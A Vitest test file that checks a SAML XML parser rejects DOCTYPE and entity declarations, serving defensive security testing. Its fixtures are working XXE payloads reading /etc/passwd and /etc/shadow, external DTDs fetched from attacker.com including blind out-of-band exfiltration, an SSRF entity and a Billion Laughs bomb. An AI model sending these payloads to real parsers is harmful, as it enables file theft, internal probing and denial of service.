/**
 * XXE (XML External Entity) Protection Tests
 *
 * Tests for XML parsing security features that prevent XXE attacks.
 * These attacks attempt to exploit XML parsers to access local files,
 * perform SSRF, or cause denial of service.
 *
 * @see https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 * @see SAML 2.0 Security Considerations
 */

import { describe, it, expect } from 'vitest';
import { parseXml } from '../xml-utils';

describe('XXE Protection', () => {
  describe('DOCTYPE Declaration Rejection', () => {
    it('should reject XML with DOCTYPE declaration', () => {
      const maliciousXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
</samlp:Response>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject XML with empty DOCTYPE', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE root>
<root>test</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject DOCTYPE regardless of case', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!doctype root>
<root>test</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });
  });

  describe('ENTITY Declaration Rejection', () => {
    it('should reject XML with internal ENTITY declaration', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY internal "some value">
]>
<root>&internal;</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject XML with external ENTITY declaration', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<root>&xxe;</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject XML with parameter entity', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });
  });

  describe('SYSTEM Reference Rejection', () => {
    it('should reject XML with SYSTEM file reference', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "file:///etc/passwd">
<root>test</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject XML with SYSTEM HTTP reference', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<root>test</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });
  });

  describe('PUBLIC Reference Rejection', () => {
    it('should reject XML with PUBLIC DTD reference', () => {
      const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE root PUBLIC "-//OASIS//DTD SAML 2.0//EN" "http://docs.oasis-open.org/saml.dtd">
<root>test</root>`;

      expect(() => parseXml(maliciousXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });
  });

  describe('XXE Attack Scenarios', () => {
    it('should reject Billion Laughs attack (XML bomb)', () => {
      const billionLaughs = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`;

      expect(() => parseXml(billionLaughs)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject SSRF via XXE', () => {
      const ssrfXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server.local/admin">
]>
<root>&xxe;</root>`;

      expect(() => parseXml(ssrfXml)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject blind XXE via out-of-band exfiltration', () => {
      const blindXxe = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>`;

      expect(() => parseXml(blindXxe)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject XXE in SAML Response context', () => {
      const samlXxe = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response123"
                Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
</samlp:Response>`;

      expect(() => parseXml(samlXxe)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });

    it('should reject XXE in LogoutRequest context', () => {
      const logoutXxe = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<samlp:LogoutRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                     ID="_logout123"
                     Version="2.0"
                     IssueInstant="2024-01-01T00:00:00Z">
  <saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:NameID>
</samlp:LogoutRequest>`;

      expect(() => parseXml(logoutXxe)).toThrow(
        'XML security error: DOCTYPE declarations are not allowed in SAML messages'
      );
    });
  });

  describe('Valid SAML XML Acceptance', () => {
    it('should accept valid SAML Response without DOCTYPE', () => {
      const validSaml = `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response123"
                Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
</samlp:Response>`;

      expect(() => parseXml(validSaml)).not.toThrow();
    });

    it('should accept valid SAML Assertion', () => {
      const validAssertion = `<?xml version="1.0" encoding="UTF-8"?>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_assertion123"
                Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
      user@example.com
    </saml:NameID>
  </saml:Subject>
</saml:Assertion>`;

      expect(() => parseXml(validAssertion)).not.toThrow();
    });

    it('should accept SAML metadata without DOCTYPE', () => {
      const metadata = `<?xml version="1.0" encoding="UTF-8"?>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
                     entityID="https://idp.example.com">
  <md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                            Location="https://idp.example.com/sso"/>
  </md:IDPSSODescriptor>
</md:EntityDescriptor>`;

      expect(() => parseXml(metadata)).not.toThrow();
    });

    it('should accept XML with SYSTEM-like text in element content', () => {
      // This should NOT be rejected because SYSTEM is in element content, not a declaration
      const validXml = `<?xml version="1.0"?>
<root>
  <description>The SYSTEM uses PUBLIC APIs</description>
</root>`;

      expect(() => parseXml(validXml)).not.toThrow();
    });
  });
});
